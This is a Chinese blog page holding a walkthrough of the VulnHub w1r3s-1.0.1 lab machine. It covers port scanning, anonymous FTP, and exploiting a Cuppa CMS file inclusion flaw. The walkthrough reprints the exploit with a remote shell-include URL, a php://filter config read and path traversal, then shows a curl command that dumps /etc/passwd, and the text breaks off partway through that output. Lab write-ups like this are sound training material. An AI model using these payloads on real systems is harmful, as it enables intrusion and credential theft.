@@ -1,0 +1,2483 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wh1teJ0kerのBlog</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@日常练习">
+    <meta name="author" content="Wh1teJ0ker">
+    <link rel="canonical" href="http://localhost:1313/post/vulnhubw1r3s101-zep7pg.html">
+
+    <link rel="alternate" type="application/rss+xml" href="http://localhost:1313//index.xml" title="Wh1teJ0kerのBlog">
+
+    
+
+
+<script async defer data-website-id="56cc42c1-3656-4d3e-af3c-acded927b8ed" src="https://analytics.umami.is/script.js"></script>
+
+    <meta property="og:url" content="http://localhost:1313/post/vulnhubw1r3s101-zep7pg.html">
+  <meta property="og:site_name" content="Wh1teJ0kerのBlog">
+  <meta property="og:title" content="VulnHub-w1r3s-1.0.1">
+  <meta property="og:description" content="日常练习">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-03-03T14:41:56+08:00">
+    <meta property="article:modified_time" content="2025-05-07T21:33:23+08:00">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="VulnHub-w1r3s-1.0.1">
+  <meta name="twitter:description" content="日常练习">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "VulnHub-w1r3s-1.0.1",
+      "item": "http://localhost:1313/post/vulnhubw1r3s101-zep7pg.html"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "VulnHub-w1r3s-1.0.1",
+  "name": "VulnHub-w1r3s-1.0.1",
+  "description": "日常练习",
+  "keywords": [
+    
+  ],
+  "articleBody": "VulnHub-w1r3s-1.0.1 载入虚拟机后是一个未知账户，需要密码，流程开始\n信息搜集 查找主机 先查看自身主机，发现本地的ip为192.168.152.131，所在网段应该就是192.168.200.0/24\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/桌面] └─$ ip a 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:82:4e:1f brd ff:ff:ff:ff:ff:ff inet 192.168.152.131/24 brd 192.168.152.255 scope global dynamic noprefixroute eth0 valid_lft 1414sec preferred_lft 1414sec inet6 fe80::3021:1752:2678:7550/64 scope link noprefixroute valid_lft forever preferred_lft forever 因此开始扫描该网段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sn 192.168.152.0/24 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:32 EDT Nmap scan report for 192.168.152.1 Host is up (0.00020s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 192.168.152.2 Host is up (0.00016s latency). MAC Address: 00:50:56:FB:F0:8A (VMware) Nmap scan report for 192.168.152.132 Host is up (0.00022s latency). MAC Address: 00:0C:29:60:2F:0A (VMware) Nmap scan report for 192.168.152.254 Host is up (0.00032s latency). MAC Address: 00:50:56:E9:C0:09 (VMware) Nmap scan report for 192.168.152.131 Host is up. Nmap done: 256 IP addresses (5 hosts up) scanned in 1.92 seconds 注意点\n-sn参数是仅ping，而不进行端口扫描，-sP参数已废弃\n使用arp-scan命令也能达到同样的效果\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/桌面] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:82:4e:1f, IPv4: 192.168.152.131 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.152.1 00:50:56:c0:00:08 VMware, Inc. 192.168.152.2 00:50:56:fb:f0:8a VMware, Inc. 192.168.152.132 00:0c:29:60:2f:0a VMware, Inc. 192.168.152.254 00:50:56:e9:c0:09 VMware, Inc. 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 4 responded 注意\n可以利用靶机上下线，确定自己的靶机IP\n端口扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap --min-rate 10000 -p- 192.168.152.132 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:55 EDT Nmap scan report for 192.168.152.132 Host is up (0.00018s latency). Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 3306/tcp open mysql MAC Address: 00:0C:29:60:2F:0A (VMware) Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds 注意\n-p是指定端口参数，而-p-是指全端口扫描，防止存在信息遗漏\n又学到一手，细节太多了，tql\n小技巧\n如果扫描过程中存在大量端口，可以的处理方法\n首先在上述扫描的时候可以先将扫描参数保存\n1 sudo nmap --min-rate 10000 -p- 192.168.152.132 -oA [路径] 提取分割\n1 grep open [路径] | awk -F '/' '{print $1}' | paste -sd ',' 指定变量\n1 2 ports=grep open [路径] | awk -F '/' '{print $1}' | paste -sd ',' echo $ports 详细信息扫描 TCP扫描 -sT：指定TCP协议 -sV：探测各服务的版本 -sC：使用默认脚本 -O：探测各操作系统的版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.152.132 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:10 EDT Nmap scan report for 192.168.152.132 Host is up (0.00048s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 content | drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 docs |_drwxr-xr-x 2 ftp ftp 4096 Jan 28 2018 new-employees | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.152.131 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA) | 256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA) |_ 256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:60:2F:0A (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (94%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%), Synology DiskStation Manager 5.2-5644 (92%), Linux 3.16 - 4.6 (91%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds UDP扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -sU --top-ports 20 192.168.152.132 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:18 EDT Nmap scan report for 192.168.152.132 Host is up (0.00050s latency). PORT STATE SERVICE 53/udp open|filtered domain 67/udp open|filtered dhcps 68/udp open|filtered dhcpc 69/udp open|filtered tftp 123/udp open|filtered ntp 135/udp open|filtered msrpc 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open|filtered snmp 162/udp open|filtered snmptrap 445/udp open|filtered microsoft-ds 500/udp open|filtered isakmp 514/udp open|filtered syslog 520/udp open|filtered route 631/udp open|filtered ipp 1434/udp open|filtered ms-sql-m 1900/udp open|filtered upnp 4500/udp open|filtered nat-t-ike 49152/udp open|filtered unknown MAC Address: 00:0C:29:60:2F:0A (VMware) Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds vuln脚本扫描 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ┌──(kali㉿kali)-[~/桌面] └─$ sudo nmap -script=vuln -p21,22,80,3306 192.168.152.132 Nmap scan report for 192.168.152.132 Host is up (0.00039s latency). PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. |_http-csrf: Couldn't find any CSRF vulnerabilities. |_http-dombased-xss: Couldn't find any DOM based XSS. | http-enum: |_ /wordpress/wp-login.php: Wordpress login page. | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 3306/tcp open mysql MAC Address: 00:0C:29:60:2F:0A (VMware) Nmap done: 1 IP address (1 host up) scanned in 321.65 seconds 必要时尝试IPV6\nFTP渗透 匿名登录 在信息搜集的过程中，nmap扫描到ftp开放，可以使用匿名登录\n1 ftp-anon: Anonymous FTP login allowed (FTP code 230) 用户名就为Anonymous，密码为空\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/桌面] └─$ ftp 192.168.152.132 Connected to 192.168.152.132. 220 Welcome to W1R3S.inc FTP service. Name (192.168.152.132:kali): Anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e 选择切换binary模式\n1 2 ftp\u003e binary 200 Switching to Binary mode. 注意\n不进行切换到binary模式，下载的可执行文件可能损坏\n信息泄露 content 进入content文件查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ftp\u003e ls 229 Entering Extended Passive Mode (|||45116|) 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 content drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 docs drwxr-xr-x 2 ftp ftp 4096 Jan 28 2018 new-employees 226 Directory send OK. ftp\u003e cd content 250 Directory successfully changed. ftp\u003e ls 229 Entering Extended Passive Mode (|||45048|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 29 Jan 23 2018 01.txt -rw-r--r-- 1 ftp ftp 165 Jan 23 2018 02.txt -rw-r--r-- 1 ftp ftp 582 Jan 23 2018 03.txt 226 Directory send OK. 对查看的文件进行下载操作\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ftp\u003e mget *.txt mget 01.txt [anpqy?]? y 229 Entering Extended Passive Mode (|||46201|) 150 Opening BINARY mode data connection for 01.txt (29 bytes). 100% |*************************************************************| 29 35.17 KiB/s 00:00 ETA 226 Transfer complete. 29 bytes received in 00:00 (18.66 KiB/s) mget 02.txt [anpqy?]? y 229 Entering Extended Passive Mode (|||44162|) 150 Opening BINARY mode data connection for 02.txt (165 bytes). 100% |*************************************************************| 165 254.55 KiB/s 00:00 ETA 226 Transfer complete. 165 bytes received in 00:00 (117.27 KiB/s) mget 03.txt [anpqy?]? y 229 Entering Extended Passive Mode (|||49788|) 150 Opening BINARY mode data connection for 03.txt (582 bytes). 100% |*************************************************************| 582 888.06 KiB/s 00:00 ETA 226 Transfer complete. 582 bytes received in 00:00 (435.52 KiB/s) 小技巧\n避免交互式确认\n1 2 ftp\u003e prompt Interactive mode off. docs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ftp\u003e cd .. 250 Directory successfully changed. ftp\u003e ls 229 Entering Extended Passive Mode (|||47572|) 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 content drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 docs drwxr-xr-x 2 ftp ftp 4096 Jan 28 2018 new-employees 226 Directory send OK. ftp\u003e cd docs 250 Directory successfully changed. ftp\u003e ls 229 Entering Extended Passive Mode (|||43184|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 138 Jan 23 2018 worktodo.txt 226 Directory send OK. new-employees 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ftp\u003e cd new-employees 250 Directory successfully changed. ftp\u003e ls 229 Entering Extended Passive Mode (|||43732|) 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 155 Jan 28 2018 employee-names.txt 226 Directory send OK. ftp\u003e get employee-names.txt local: employee-names.txt remote: employee-names.txt 229 Entering Extended Passive Mode (|||45279|) 150 Opening BINARY mode data connection for employee-names.txt (155 bytes). 100% |*************************************************************| 155 137.35 KiB/s 00:00 ETA 226 Transfer complete. 155 bytes received in 00:00 (82.13 KiB/s) 所有内容查看并下载完毕，可以退出ftp\n整理破解 先查看数字文本中的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ┌──(kali㉿kali)-[~/桌面] └─$ cat *.txt New FTP Server For W1R3S.inc # # # # # # # # 01ec2d8fc11c493b25029fb1f47f39ce # # # # # # # # # # # # # SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg== ############################################ ___________.__ __ __ ______________________ _________ .__ \\__ ___/| |__ ____ / \\ / \\/_ \\______ \\_____ \\ / _____/ |__| ____ ____ | | | | \\_/ __ \\ \\ \\/\\/ / | || _/ _(__ \u003c \\_____ \\ | |/ \\_/ ___\\ | | | Y \\ ___/ \\ / | || | \\/ \\/ \\ | | | \\ \\___ |____| |___| /\\___ \u003e \\__/\\ / |___||____|_ /______ /_______ / /\\ |__|___| /\\___ \u003e \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/ The W1R3S.inc employee list Naomi.W - Manager Hector.A - IT Dept Joseph.G - Web Design Albert.O - Web Design Gina.L - Inventory Rico.D - Human Resources ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡ ....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ 可以看到存在两个密码\n有一段结尾为==，很明显可能与base64有关，尝试解密\n​​\n1 It is easy, but not that easy.. 还有一段尝试识别\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 ┌──(kali㉿kali)-[~/桌面] └─$ hash-identifier ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### -------------------------------------------------- HASH: 01ec2d8fc11c493b25029fb1f47f39ce Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------- 尝试md5解密\n​​\n1 This is not a password 除两端疑似密文外，但是没有得到什么有价值的信息\n可以看到还存在相关的员工列表，通过相关的搜集可能获得部分更高权限，得到相关的立足点\n1 2 3 4 5 6 7 8 The W1R3S.inc employee list Naomi.W - Manager Hector.A - IT Dept Joseph.G - Web Design Albert.O - Web Design Gina.L - Inventory Rico.D - Human Resources 然后是一段明显是颠倒的信息，通过在线网站\nUpside Down Text | Flip Text, Type Upside Down, or Backwards Text\n​​\n​​\nMySQL 1 2 3 4 ┌──(kali㉿kali)-[~/桌面] └─$ mysql -h 192.168.152.132 -u root -p Enter password: ERROR 1130 (HY000): Host '192.168.152.131' is not allowed to connect to this MySQL server 尝试空密码，但是很明显失败了\nWeb渗透 当然，还有一个80端口，存在着web服务，是值得去尝试的\n打开后是一个基本的ubuntu服务器的页面\n​​\n进行目录爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ┌──(kali㉿kali)-[~/桌面] └─$ dirsearch -u http://192.168.152.132:80/ _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/桌面/reports/http_192.168.152.132_80/__24-03-11_01-27-32.txt Target: http://192.168.152.132/ [01:27:32] Starting: [01:27:33] 403 - 301B - /.ht_wsr.txt [01:27:33] 403 - 304B - /.htaccess.bak1 [01:27:33] 403 - 304B - /.htaccess.orig [01:27:33] 403 - 304B - /.htaccess.save [01:27:33] 403 - 304B - /.htaccess_orig [01:27:33] 403 - 302B - /.htaccessBAK [01:27:33] 403 - 302B - /.htaccessOLD [01:27:33] 403 - 306B - /.htaccess.sample [01:27:33] 403 - 305B - /.htaccess_extra [01:27:33] 403 - 302B - /.htaccess_sc [01:27:33] 403 - 295B - /.html [01:27:33] 403 - 294B - /.htm [01:27:33] 403 - 303B - /.htaccessOLD2 [01:27:33] 403 - 301B - /.httr-oauth [01:27:33] 403 - 300B - /.htpasswds [01:27:33] 403 - 304B - /.htpasswd_test [01:27:34] 403 - 294B - /.php [01:27:34] 403 - 295B - /.php3 [01:27:40] 301 - 326B - /administrator -\u003e http://192.168.152.132/administrator/ [01:27:40] 302 - 7KB - /administrator/ -\u003e installation/ [01:27:40] 302 - 7KB - /administrator/index.php -\u003e installation/ [01:27:51] 301 - 323B - /javascript -\u003e http://192.168.152.132/javascript/ [01:28:01] 403 - 304B - /server-status/ [01:28:01] 403 - 303B - /server-status [01:28:09] 200 - 1KB - /wordpress/wp-login.php [01:28:09] 301 - 0B - /wordpress/ -\u003e http://localhost/wordpress/ 通过扫描明显看出存在wordpress和administrator的后台目录\n因此下面也就是两个方向\nadministrator 进入后发现应该是一个系统配置界面\n​​\n​​\n注意\n这里也存在一个问题，就是由于这个是一个靶机，所以对于相关操作没有太大心理压力，但是如果是真实环境，就可能担心会对系统及服务造成不可逆的损失，或者出现暴露，牢记，所有的测试要保证自身安全的情况下进行！\n​​\n无法对管理员进行新的创建，因此考虑查找其他方向\n漏洞利用 查找相关漏洞\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/桌面] └─$ searchsploit cuppa cms ---------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------- --------------------------------- Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 将相关exp信息进行下载\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/桌面] └─$ searchsploit cuppa -m 25971 [!] Could not find EDB-ID # Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion URL: https://www.exploit-db.com/exploits/25971 Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt Codes: OSVDB-94101 Verified: True File Type: C++ source, ASCII text, with very long lines (876) Copied to: /home/kali/桌面/25971.txt 查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 # Exploit Title : Cuppa CMS File Inclusion # Date : 4 June 2013 # Exploit Author : CWH Underground # Site : www.2600.in.th # Vendor Homepage : http://www.cuppacms.com/ # Software Link : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip # Version : Beta # Tested on : Window and Linux ,--^----------,--------,-----,-------^--, | ||||||||| `--------' | O .. CWH Underground Hacking Team .. `+---------------------------^----------| `\\_,-------, _________________________| / XXXXXX /`| / / XXXXXX / `\\ / / XXXXXX /\\______( / XXXXXX / / XXXXXX / (________( `------' #################################### VULNERABILITY: PHP CODE INJECTION #################################### /alerts/alertConfigField.php (LINE: 22) ----------------------------------------------------------------------------- LINE 22: \u003c?php include($_REQUEST[\"urlConfig\"]); ?\u003e ----------------------------------------------------------------------------- ##################################################### DESCRIPTION ##################################################### An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise. http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI] ##################################################### EXPLOIT ##################################################### http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt? http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd Moreover, We could access Configuration.php source code via PHPStream For Example: ----------------------------------------------------------------------------- http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php ----------------------------------------------------------------------------- Base64 Encode Output: ----------------------------------------------------------------------------- PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+ ----------------------------------------------------------------------------- Base64 Decode Output: ----------------------------------------------------------------------------- \u003c?php class Configuration{ public $host = \"localhost\"; public $db = \"cuppa\"; public $user = \"root\"; public $password = \"Db@dmin\"; public $table_prefix = \"cu_\"; public $administrator_template = \"default\"; public $list_limit = 25; public $token = \"OBqIPqlFWf3X\"; public $allowed_extensions = \"*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx\"; public $upload_default_path = \"media/uploadsFiles\"; public $maximum_file_size = \"5242880\"; public $secure_login = 0; public $secure_login_value = \"\"; public $secure_login_redirect = \"\"; } ?\u003e ----------------------------------------------------------------------------- Able to read sensitive information via File Inclusion (PHP Stream) ################################################################################################################ Greetz : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 ################################################################################################################ 随后，在根据上述信息，查看/etc/passwd\n1 /administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd ​​\n路径没问题，但是无法显示，因此在尝试下一种方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 ┌──(kali㉿kali)-[~/桌面] └─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.152.132/administrator/alerts/alertConfigField.php Configuration: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip 